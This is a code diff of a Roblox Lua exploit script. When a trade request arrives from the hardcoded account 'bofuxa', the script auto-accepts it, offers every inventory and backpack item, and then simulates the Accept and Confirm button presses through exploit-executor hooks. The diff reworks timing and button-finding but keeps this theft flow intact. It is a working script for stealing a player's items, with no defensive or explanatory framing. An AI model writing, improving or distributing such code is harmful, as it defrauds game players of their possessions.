@@ -11,46 +11,13 @@ local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
-local function clickTradeButton(buttonNamePattern)
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-    if not playerGui then return false end
-    
-    local tradeGui = playerGui:FindFirstChild("TradeGUI")
-    if not tradeGui then return false end
-    
-    for _, descendant in ipairs(tradeGui:GetDescendants()) do
-        if descendant:IsA("GuiButton") then
-            local fullName = descendant:GetFullName():lower()
-            if fullName:find(buttonNamePattern) then
-                if getconnections then
-                    pcall(function()
-                        for _, conn in ipairs(getconnections(descendant.Activated)) do
-                            conn:Fire()
-                        end
-                        for _, conn in ipairs(getconnections(descendant.MouseButton1Click)) do
-                            conn:Fire()
-                        end
-                    end)
-                end
-                
-                pcall(function()
-                    descendant:Activate()
-                end)
-                
-                print("Triggered button matching: " .. buttonNamePattern)
-                return true
-            end
-        end
-    end
-    return false
-end
-
 SendRequest.OnClientInvoke = function(senderPlayer)
     local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
     
     if senderName:lower() == "bofuxa" then
         print("Trade request verified from bofuxa. Accepting...")
         
+        -- Make sure TradeGUI elements are visible so the buttons exist and can be clicked/interacted with
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
             local tradeGui = playerGui:FindFirstChild("TradeGUI")
@@ -58,30 +25,20 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 for _, childName in ipairs({"Container", "Processing", "BG"}) do
                     local element = tradeGui:FindFirstChild(childName)
                     if element then
-                        element.Visible = true
+                        element.Visible = true -- Ensuring visibility so buttons are interactive
                     end
                 end
             end
         end
 
-        pcall(function()
-            AcceptRequest:FireServer()
-        end)
+        AcceptRequest:FireServer()
         
         task.spawn(function()
-            print("Trade accepted! Waiting 1 second before adding all items...")
-            task.wait(1)
+            print("Waiting for trade to start...")
+            StartTradeEvent.OnClientEvent:Wait()
             
-            pcall(function()
-                if firesignal then
-                    firesignal(StartTradeEvent.OnClientEvent, {
-                        Locked = false,
-                        LastOffer = tick(),
-                        Player2 = { Player = LocalPlayer, Offer = {}, Accepted = false },
-                        Player1 = { Player = senderPlayer, Offer = {}, Accepted = false }
-                    }, "Bofuxa")
-                end
-            end)
+            print("Trade started! Waiting 1 second before offering items...")
+            task.wait(1)
             
             local inventoryContainer = nil
             local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
@@ -132,9 +89,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
 
                         for i = 1, count do
-                            pcall(function()
-                                OfferItemEvent:FireServer(itemName, category)
-                            end)
+                            OfferItemEvent:FireServer(itemName, category)
                             offeredCount = offeredCount + 1
                             task.wait(0.05)
                         end
@@ -145,9 +100,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
-                            pcall(function()
-                                OfferItemEvent:FireServer(tool.Name, "Weapons")
-                            end)
+                            OfferItemEvent:FireServer(tool.Name, "Weapons")
                             offeredCount = offeredCount + 1
                             task.wait(0.05)
                         end
@@ -156,9 +109,10 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
-            print("Finished adding items. Waiting 8 seconds before accepting and confirming trade...")
-            task.wait(8)
+            print("Waiting 3 seconds before triggering Accept and Confirm...")
+            task.wait(3)
 
+            -- Fire server-side trade acceptance events
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
             end)
@@ -166,53 +120,37 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 AcceptTradeEvent:FireServer()
             end)
 
-            if firesignal and AcceptTradeEvent.OnClientEvent then
-                pcall(function()
-                    firesignal(AcceptTradeEvent.OnClientEvent, false)
-                end)
+            -- Automatically find and press the Accept and Confirm buttons on mobile UI
+            local function fireButton(btn)
+                if btn and btn:IsA("GuiButton") then
+                    if getconnections then
+                        for _, connection in ipairs(getconnections(btn.Activated)) do
+                            connection:Fire()
+                        end
+                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
+                            connection:Fire()
+                        end
+                    end
+                    pcall(function()
+                        btn:Activate()
+                    end)
+                end
             end
 
-            local player = game:GetService("Players").LocalPlayer
-            local actionsFolder = player.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")
-
-            local function fireButton(btn)
-                if btn and btn:IsA("GuiButton") and getconnections then
-                    for _, connection in ipairs(getconnections(btn.Activated)) do
-                        connection:Fire()
-                    end
-                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                        connection:Fire()
+            -- Target exact paths for TradeGUI buttons
+            if playerGui then
+                local tradeGui = playerGui:FindFirstChild("TradeGUI")
+                if tradeGui then
+                    -- Search specifically for Accept and Confirm action buttons
+                    for _, gui in ipairs(tradeGui:GetDescendants()) do
+                        if gui:IsA("GuiButton") then
+                            local fullName = gui:GetFullName():lower()
+                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
+                                fireButton(gui)
+                            end
+                        end
                     end
                 end
-                pcall(function()
-                    if btn and btn:IsA("GuiButton") then
-                        btn:Activate()
-                    end
-                end)
-            end
-
-            local successFirst, firstButton = pcall(function()
-                return actionsFolder:WaitForChild("Accept", 3):WaitForChild("ActionButton", 3)
-            end)
-
-            if successFirst and firstButton then
-                fireButton(firstButton)
-                print("Triggered first ActionButton")
-            else
-                clickTradeButton("accept")
-            end
-
-            task.wait(1)
-
-            local successConfirm, confirmButton = pcall(function()
-                return actionsFolder:WaitForChild("Accept", 3):WaitForChild("Confirm", 3):WaitForChild("ActionButton", 3)
-            end)
-
-            if successConfirm and confirmButton then
-                fireButton(confirmButton)
-                print("Triggered confirmation ActionButton")
-            else
-                clickTradeButton("confirm")
             end
         end)
 
